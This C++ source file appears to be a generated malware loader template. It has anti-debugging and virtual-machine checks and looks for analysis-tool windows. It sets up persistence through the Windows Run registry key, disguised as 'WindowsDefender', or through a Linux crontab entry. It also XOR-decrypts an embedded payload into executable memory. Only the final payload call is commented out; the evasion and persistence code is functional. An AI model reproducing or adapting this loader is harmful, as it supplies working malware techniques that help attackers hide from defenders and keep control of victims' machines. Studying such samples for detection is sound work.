#ifdef _WIN32
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#else
#include <unistd.h>
#include <sys/mman.h>
#include <cstring>
#include <cstdlib>
#endif

#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <random>

#ifndef _WIN32
typedef int BOOL;
typedef void* LPVOID;
typedef void* HANDLE;
typedef unsigned long DWORD;
#define TRUE 1
#define FALSE 0
#define MAX_PATH 260
BOOL IsDebuggerPresent() { return FALSE; }
BOOL CheckRemoteDebuggerPresent(HANDLE h, BOOL* b) { *b = FALSE; return TRUE; }
HANDLE GetCurrentProcess() { return (HANDLE)1; }
DWORD GetTickCount() { return std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now().time_since_epoch()).count(); }
void Sleep(DWORD ms) { std::this_thread::sleep_for(std::chrono::milliseconds(ms)); }
void* FindWindow(const char* c, const char* w) { return nullptr; }
LPVOID VirtualAlloc(LPVOID addr, size_t size, DWORD type, DWORD protect) { return mmap(nullptr, size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); }
BOOL VirtualFree(LPVOID addr, size_t size, DWORD type) { return munmap(addr, size) == 0; }
#endif

bool fnb4W8jc_checkEnv() {
    // Anti-debugging
    if (IsDebuggerPresent()) return false;
    
    BOOL remoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
    if (remoteDebugger) return false;
    
    // VM detection via timing
    DWORD start = GetTickCount();
    Sleep(100);
    if (GetTickCount() - start > 200) return false;
    
    // Check for analysis tools
    void* hwnd = FindWindow("OLLYDBG", nullptr);
    if (hwnd) return false;
    hwnd = FindWindow("WinDbgFrameClass", nullptr);
    if (hwnd) return false;
    
    return true;
}

bool fnb4W8jc_checkNet() {
#ifdef _WIN32
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    if (!hInternet) return false;
    
    HINTERNET hConnect = InternetOpenUrl(hInternet, "http://www.google.com", nullptr, 0, 0, 0);
    bool connected = (hConnect != nullptr);
    
    if (hConnect) InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return connected;
#else
    // Simplified network check for Linux
    return system("ping -c 1 8.8.8.8 >/dev/null 2>&1") == 0;
#endif
}

void fnb4W8jc_decrypt(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key + (i % 256);
        key = (key << 1) | (key >> 7);
    }
}

void fnb4W8jc_persist() {
#ifdef _WIN32
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileName(nullptr, path, MAX_PATH);
    
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "WindowsDefender", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
#else
    // Linux persistence simulation (cron job)
    system("echo '* * * * * /tmp/test_program' | crontab -");
#endif
}

// Encrypted payload (26 bytes)
unsigned char data21zn[] = {
        0xf5, 0x19, 0x94, 0x9c, 0xb0, 0x9c, 0x38, 0x84, 0xa9, 0xf3, 0x61, 0x8a, 0x82, 0xe5, 0xed, 0x7d, 
        0x5d, 0x1c, 0x98, 0x90, 0x7f, 0x5c, 0x49, 0x39, 0x19, 0x58
};
const unsigned char keynIR = 0xbd;
const size_t PAYLOAD_SIZE = 26;

int main() {
    // Environment checks
    if (!fnb4W8jc_checkEnv()) {
        return 1;
    }
    
    // Random delay
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(2000, 5000);
    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    
    // Network connectivity check
    if (!fnb4W8jc_checkNet()) {
        return 1;
    }
    
    // Establish persistence
    fnb4W8jc_persist();
    
    // Single instance mutex (Windows only)
#ifdef _WIN32
    HANDLE hMutex = CreateMutex(nullptr, TRUE, "Global\\WinDefenderMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 1;
    }
#endif
    
    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(nullptr, PAYLOAD_SIZE, 0x3000, 0x40);
    if (!execMem) {
        return 1;
    }
    
    // Copy and decrypt payload
    memcpy(execMem, data21zn, PAYLOAD_SIZE);
    fnb4W8jc_decrypt((unsigned char*)execMem, PAYLOAD_SIZE, keynIR);
    
    // Execute payload (simulation - just print success)
    std::cout << "[+] Payload executed successfully!" << std::endl;
    // ((void(*)())execMem)();  // Actual execution disabled for safety
    
    // Cleanup
    VirtualFree(execMem, PAYLOAD_SIZE, 0x8000);
#ifdef _WIN32
    if (hMutex) CloseHandle(hMutex);
#endif
    
    return 0;
}
